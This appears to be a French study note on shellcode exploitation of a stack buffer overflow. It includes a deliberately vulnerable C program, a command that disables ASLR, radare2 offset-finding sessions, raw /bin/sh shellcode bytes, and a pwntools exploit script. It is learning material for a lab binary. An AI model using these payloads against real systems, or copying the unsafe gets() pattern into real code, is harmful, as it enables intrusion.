## Doc

- [Ghostsinthestack : Automatisation de la conception de shellcodes](https://web.archive.org/web/20070915050753/http://www.ghostsinthestack.org/article-7-automatisation-de-la-conception-de-shellcodes.html)

## Development

- https://stackoverflow.com/questions/15593214/linux-shellcode-hello-world/15704848#15704848
- https://zestedesavoir.com/articles/158/ecrivez-votre-premier-shellcode-en-asm-x86/
- https://github.com/voydstack/shellcoding/tree/master/x86
- https://syscall.sh/, https://syscalls.mebeim.net/?table=x86/64/x64/v6.6 , https://j00ru.vexillium.org/syscalls/nt/64/

## Programme vulnérable (cf ../stack/ret2libc)

```c
// gcc source.c -o vuln -no-pie -fno-stack-protector -z execstack -m32

#include <stdio.h>

void unsafe() {
    char buffer[300];
    
    puts("Overflow me");
    gets(buffer);
}

void main() {
    unsafe();
}
```
## Désactiver l'ASLR

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## Trouver le padding

```bash
$ ragg2 -P 400 -r
<copy this>

$ r2 -d -A vuln
[0xf7fd40b0]> dc
Overflow me
<<paste here>>
[0x73424172]> wopO `dr eip`
312
```

## Trouver le buffer dans la mémoire 

```bash
$ r2 -d -A vuln

[0xf7fe3c60]> s sym.unsafe ; pdf
            ; CALL XREF from main @ 0x80491c1(x)
┌ 63: sym.unsafe ();
│           ; var int32_t var_4h @ ebp-0x4
│           ; var int32_t var_134h @ ebp-0x134
│           0x08049172      55             push ebp
│           0x08049173      89e5           mov ebp, esp
│           0x08049175      53             push ebx
│           0x08049176      81ec34010000   sub esp, 0x134
│           0x0804917c      e82fffffff     call sym.__x86.get_pc_thunk.bx
│           0x08049181      81c37f2e0000   add ebx, 0x2e7f
│           0x08049187      83ec0c         sub esp, 0xc
│           0x0804918a      8d8308e0ffff   lea eax, [ebx - 0x1ff8]
│           0x08049190      50             push eax
│           0x08049191      e8aafeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x08049196      83c410         add esp, 0x10
│           0x08049199      83ec0c         sub esp, 0xc
│           0x0804919c      8d85ccfeffff   lea eax, [var_134h]
│           0x080491a2      50             push eax
│           0x080491a3      e888feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x080491a8      83c410         add esp, 0x10
│           0x080491ab      90             nop
│           0x080491ac      8b5dfc         mov ebx, dword [var_4h]
│           0x080491af      c9             leave
└           0x080491b0      c3             ret
[0x08049172]> db 0x080491a8     <== Breakpoint after gets()
[0x08049172]> dc
Overflow me
<<Found me>>                    <== This was my input
hit breakpoint at: 80491a8
[0x080491a8]> px @ ebp - 0x134  <== Size of input
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffcfb4  3c3c 466f 756e 6420 6d65 3e3e 00d1 fcf7  <<Found me>>....

[...]
```

## Exploitation

Débuggage attaché au processus avec gdb:

- ajout nopsled
- changement shellcode `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80` (len = 23)

![](./images/find_shellcode.png)

-> On trouve bien **l'addresse du shellcode** : 0xffffcfb4

Programme équivalent, mais  SIGSEV:

```python
from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = asm(shellcraft.sh())          # The shellcode
payload = payload.ljust(312, b'\x90')	# The padding
payload += p32(0xffffcfb4)              # Address of the Shellcode

log.info(p.clean())

p.send(payload)

p.interactive()
```

### Writing shellcode

```python
shellcode = asm("""
	xor rsi, rsi
	#...
	syscall
""")
```

## Overwritten bytes

```py
# offset = padding to saved rip
# TO CHANGE:
clobber , bad_len = overwritten_pos , len_overwritten # 0x14, 4

shell_at = offset + 8

# stub_at >= clobber + bad_len
# stub_at + stub_len <= offset
stub_at = ((clobber + bad_len + 7) // 8) * 8

jmp_dist = shell_at - (stub_at)
stub = asm(f"jmp $+{jmp_dist}")

payload = b"\x90"*stub_at
payload += stub

payload += b"\x90"*(offset - len(payload))
payload += p64(buffer + stub_at) 
payload += shellcode

p.send(payload)
```

